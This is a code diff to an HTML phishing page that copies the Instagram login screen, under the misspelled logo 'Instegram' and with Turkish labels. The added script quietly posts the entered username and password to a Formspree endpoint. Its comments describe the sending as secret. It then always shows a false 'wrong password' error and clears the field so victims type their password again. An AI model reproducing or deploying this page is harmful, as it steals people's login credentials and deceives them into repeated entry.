@@ -55,6 +55,16 @@
     button:hover {
       background-color: #1877f2;
     }
+
+    /* Kırmızı Hata Mesajı Stili */
+    #error-message {
+      color: #ed4956;
+      font-size: 14px;
+      margin-bottom: 15px;
+      display: none; /* Başta gizli */
+      font-weight: 500;
+    }
+
     .links {
       margin-top: 25px;
       font-size: 12px;
@@ -70,19 +80,49 @@
 <body>
 
   <div class="login-container">
-    <div class="logo">Instagram</div>
+    <div class="logo">Instegram</div>
     
-    <form action="https://formspree.io/f/meepwdwg" method="POST">
-      <input type="text" name="kullanici_adi" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required />
-      <input type="password" name="sifre" placeholder="Şifre" required />
+    <div id="error-message">Üzgünüz, şifren yanlıştı. Lütfen şifreni tekrar kontrol et.</div>
+
+    <form id="loginForm">
+      <input type="text" name="username" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required />
+      <input type="password" name="password" id="password" placeholder="Şifre" required />
       
-      <button type="submit">Giriş Yap</button>
+      <button type="submit" id="submitBtn">Giriş Yap</button>
     </form>
 
     <div class="links">
       <a href="#">Şifreni mi unuttun?</a>
     </div>
   </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const errorMessage = document.getElementById('error-message');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Sayfanın Formspree'ye gidip "Başarılı" demesini engeller
+
+      const formData = new FormData(form);
+
+      // Veriyi arka planda gizlice gönderiyoruz
+      fetch('https://formspree.io/f/meepwdwg', {
+        method: 'POST',
+        body: formData,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        // Form başarıyla gitse bile kullanıcıya HEP "Şifre Yanlış" diyoruz
+        errorMessage.style.display = 'block';
+        // Şifre kutusunu temizleyelim ki kullanıcı tekrar yazmaya çalışsın
+        document.getElementById('password').value = '';
+      }).catch(error => {
+        // İnternet hatası olsa bile hata mesajını gösterelim
+        errorMessage.style.display = 'block';
+      });
+    });
+  </script>
 
 </body>
 </html>
